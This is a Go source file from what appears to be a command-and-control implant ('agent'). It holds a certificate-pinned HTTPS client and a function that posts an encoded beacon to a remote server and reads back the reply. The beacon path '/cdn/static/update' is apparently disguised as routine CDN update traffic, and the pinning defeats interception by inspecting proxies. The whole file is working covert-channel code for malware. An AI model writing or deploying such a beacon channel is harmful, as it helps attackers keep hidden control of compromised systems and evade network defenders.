package agent

import (
	"bytes"
	"context"
	"crypto/sha256"
	"crypto/tls"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"time"
)

const beaconPath = "/cdn/static/update"

// newPinnedClient returns an HTTP client that verifies the server's TLS
// certificate matches the expected SHA-256 fingerprint.
// InsecureSkipVerify is intentional — manual fingerprint verification replaces CA chain validation.
func newPinnedClient(expectedFP []byte) *http.Client {
	transport := &http.Transport{
		DialTLSContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
			conn, err := tls.Dial(network, addr, &tls.Config{
				InsecureSkipVerify: true, //nolint:gosec — replaced by manual fingerprint check below
			})
			if err != nil {
				return nil, err
			}
			certs := conn.ConnectionState().PeerCertificates
			if len(certs) == 0 {
				conn.Close()
				return nil, errors.New("no TLS certificates presented by server")
			}
			fp := sha256.Sum256(certs[0].Raw)
			if !bytes.Equal(fp[:], expectedFP) {
				conn.Close()
				return nil, fmt.Errorf("TLS certificate fingerprint mismatch: MITM detected")
			}
			return conn, nil
		},
	}
	return &http.Client{
		Transport: transport,
		Timeout:   15 * time.Second,
	}
}

// sendBeaconHTTPS posts an encoded beacon and returns the raw response body.
func sendBeaconHTTPS(client *http.Client, serverURL string, payload []byte) ([]byte, error) {
	resp, err := client.Post(
		serverURL+beaconPath,
		"application/octet-stream",
		bytes.NewReader(payload),
	)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("server returned %d", resp.StatusCode)
	}
	return io.ReadAll(io.LimitReader(resp.Body, 64*1024))
}
